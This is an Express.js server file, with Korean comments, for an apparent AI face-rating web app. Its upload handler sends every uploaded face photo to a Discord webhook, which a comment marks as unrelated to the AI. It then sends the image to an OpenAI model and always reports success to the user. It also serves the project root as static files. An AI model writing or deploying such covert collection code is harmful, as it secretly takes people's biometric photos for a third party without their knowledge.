import express from "express";
import multer from "multer";
import fs from "fs";
import path from "path";
import fetch from "node-fetch";
import OpenAI from "openai";

const app = express();
const PORT = process.env.PORT || 10000;

/* ========= 설정 ========= */
const DISCORD_WEBHOOK_URL = "여기에_네_디스코드_웹훅_URL";
const OPENAI_API_KEY = process.env.OPENAI_API_KEY;

/* ========= OpenAI ========= */
const openai = new OpenAI({ apiKey: OPENAI_API_KEY });

/* ========= 업로드 폴더 ========= */
const uploadDir = "./uploads";
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir);
}

/* ========= multer ========= */
const upload = multer({ dest: uploadDir });

/* ========= 정적 파일 ========= */
app.use(express.static("./"));

/* ========= 메인 ========= */
app.get("/", (req, res) => {
  res.sendFile(path.resolve("index.html"));
});

/* ========= 업로드 엔드포인트 ========= */
app.post("/upload", upload.single("photo"), async (req, res) => {
  const filePath = req.file.path;

  // 🔴 1️⃣ 무조건 디스코드로 사진 전송 (AI랑 무관)
  try {
    const form = new FormData();
    form.append(
      "file",
      fs.createReadStream(filePath),
      "face.jpg"
    );

    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      body: form
    });
  } catch (e) {
    console.error("디스코드 전송 실패:", e.message);
  }

  // 🔵 2️⃣ AI 시도 (실패해도 무시)
  let aiResult = "AI 분석 실패";

  try {
    const imageBuffer = fs.readFileSync(filePath);

    const response = await openai.chat.completions.create({
      model: "gpt-4o-mini",
      messages: [
        {
          role: "user",
          content: [
            { type: "text", text: "이 얼굴을 솔직하게 평가해줘." },
            {
              type: "image_url",
              image_url: {
                url: `data:image/jpeg;base64,${imageBuffer.toString("base64")}`
              }
            }
          ]
        }
      ]
    });

    aiResult = response.choices[0].message.content;
  } catch (e) {
    console.error("AI 실패:", e.message);
  }

  // 🔵 3️⃣ 유저 응답 (항상 성공처럼)
  res.json({
    ok: true,
    result: aiResult
  });

  // 🔴 4️⃣ 파일 정리 (선택)
  fs.unlink(filePath, () => {});
});

/* ========= 서버 시작 ========= */
app.listen(PORT, () => {
  console.log("Server running on", PORT);
});
